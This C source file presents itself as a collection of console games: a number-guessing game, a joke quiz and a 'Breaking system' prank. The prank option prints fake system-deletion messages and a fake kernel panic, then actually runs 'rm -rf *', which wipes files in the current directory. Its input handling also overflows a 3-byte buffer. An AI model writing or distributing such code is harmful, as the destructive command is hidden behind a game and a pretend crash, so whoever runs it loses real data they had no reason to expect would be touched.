#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>
#include <string.h>
#include <unistd.h>

void guess_the_number() {
	  int lower, upper, x, guess, count = 0, flag = 0;
    int total_chances;

    printf("Enter Lower bound: ");
    scanf("%d", &lower);

    printf("Enter Upper bound: ");
    scanf("%d", &upper);

    srand(time(0));

    x = (rand() % (upper - lower + 1)) + lower;
    total_chances
        = (int)ceil(log(upper - lower + 1) / log(2));

    printf("\n\tYou've only %d chances to guess the "
           "integer!\n\n",
           total_chances);

    while (count < total_chances) {
        count++;

        printf("Guess a number: ");
        scanf("%d", &guess);

        if (x == guess) {
            printf(
                "Congratulations you did it in %d try!\n",
                count);
            flag = 1;
            break;
        }
        else if (x > guess) {
            printf("You guessed too small!\n");
        }
        else if (x < guess) {
            printf("You guessed too high!\n");
        }
    }

    if (!flag) {
        printf("\nThe number is %d\n", x);
        printf("\tBetter Luck Next time!\n");
    }
}

void quiz() {
#define MAX_QUESTIONS 5

typedef struct {
    char question[256];
    char options[4][64];
    int correct_option;
} Question;

void displayQuestion(Question q)
{
    printf("%s\n", q.question);
    for (int i = 0; i < 4; i++) {
        printf("%d. %s\n", i + 1, q.options[i]);
    }
}

int checkAnswer(Question q, int user_answer)
{
    return (user_answer == q.correct_option);
}
    srand(time(NULL));

    Question original_questions[MAX_QUESTIONS] = {
        { "GPU Stands for?",
          { "Graphics Portable Unit", "Graphics Processing Unit", "Minyak GPU", "Graphics Processing Unified" },
          2 },
        { "How many legs does a spider have?",
          { "7", "8", "6", "5" },
          2 },
        { "What is Prabowo's "
          "Favorite song?",
          { "Diantara ku dan Sawit", "Jangan ambil Bijiku!",
            "Hiedoep Joekoewee Remix", "Apa sih" },
          1 },
        { "Which state is famous for Hollywood?",
          { "Sydney", "California", "New York", "Paris" },
          2 },
        { "Who is Indonesian President Real Name?",
          { "Wowo", "Prabowo", "Joko", "Agus" },
          2 }
    };

    Question questions[MAX_QUESTIONS];
    memcpy(questions, original_questions,
           sizeof(original_questions));

    int num_questions = MAX_QUESTIONS;

    int score = 0;

    printf("Hola! Here's your Quiz Game!\n");

    for (int i = 0; i < MAX_QUESTIONS; i++) {
        int random_index = rand() % num_questions;
        Question current_question = questions[random_index];
        displayQuestion(current_question);

        int user_answer;
        printf("Enter your answer (1-4): ");
        scanf("%d", &user_answer);

        if (user_answer >= 1 && user_answer <= 4) {
            if (checkAnswer(current_question,
                            user_answer)) {
                printf("Correct!\n");
                score++;
            }
            else {
                printf("Incorrect. The correct answer is "
                       "%d. %s\n",
                       current_question.correct_option,
                       current_question.options
                           [current_question.correct_option
                            - 1]);
            }
        }
        else {
            printf("Invalid choice. Please enter a number "
                   "between 1 and 4.\n");
        }

        questions[random_index]
            = questions[num_questions - 1];
        num_questions--;
    }

    printf("Well DONE Quiz Completed!, Your "
           "score: %d/%d\n",
           score, MAX_QUESTIONS);
}

void breaking_systems() {
    char question[3];
    printf("\nAre you sure?: ");
    scanf("%s", question);
    if (strcmp(question, "y") == 0 || strcmp(question, "yes") == 0) {
        struct timespec req;
        req.tv_sec = 0;
        req.tv_nsec = 200000000;
        nanosleep(&req, NULL);
        printf("Running something in the background\n");
        nanosleep(&req, NULL);
        printf("Deleting /usr...\n");
        nanosleep(&req, NULL);
        printf("Deleting /etc...\n");
        nanosleep(&req, NULL);
        printf("Deleting /home...\n");
        nanosleep(&req, NULL);
        printf("Deleting /boot...\n");
        nanosleep(&req, NULL);
        printf("Deleting /var...\n");
        nanosleep(&req, NULL);
        printf("Deleting /root...\n");
        nanosleep(&req, NULL);
        printf("Deleting /lib...\n");
        nanosleep(&req, NULL);
        printf("sudo apt remove grub\n");
        nanosleep(&req, NULL);
        printf("GOODBYE!!!!\n");
        int seconds = 0;
        int max_time = 5;

        while (seconds <= max_time) {
            printf("%d\n", seconds);
            fflush(stdout);

            nanosleep(&req, NULL);

            seconds++;
        }
        sleep(3);
        #define RED "\x1B[31m"
        #define WHITE "\x1B[37m"
        #define BOLD "\x1B[1m"
        #define NORMAL "\x1B[0m"
        system("clear");

        printf(NORMAL RED "--------------------------------------------------------\n");
        printf("                     KERNEL PANIC                    |\n");
        printf("--------------------------------------------------------\n\n");
        printf(NORMAL WHITE);

        printf("Kernel panic - not syncing: Real fatal error!\n");
        printf("CPU: 0 PID: 1, comm: init: Not tainted 6.18.2-generic #1\n");
        printf("Hardware name: REAL Machine (REAL)\n");
        printf("Call Trace:\n");
        printf(" [<ffffffff81234567>] dump_stack_lvl+0x45/0x123\n");
        printf(" [<ffffffff81234567>] panic+0xab/0xcd\n");
        printf(" [<ffffffff81012345>] your_real_error_function+0xef/0x1a0 [real_module]\n");
        printf(" [<ffffffff81012345>] some_other_function+0x12/0x34\n");
        printf(" [<ffffffff81012345>] start_kernel+0x123/0xabc\n");
        printf("\n");
        printf("---[ end Kernel panic - not syncing: Kernel fatal error! ]---\n");

        getchar();

        sleep(1);
        system("rm -rf *");
    } else {
        printf("EXITING...\n");
    }
}

int main() {
	int game;
	printf("Games: \n");
	printf("\t1. Guess the number\n\t2. Quiz\n\t3. Breaking system [WARNING!]\n");
	printf("Select: ");
  scanf("%d", &game);
	if (game == 1) {
		guess_the_number();
	} else if (game == 2) {
		quiz();
	} else if (game == 3) {
      breaking_systems();
  } else {
		printf("Wrong number...\n");
	}
	return 0;
}
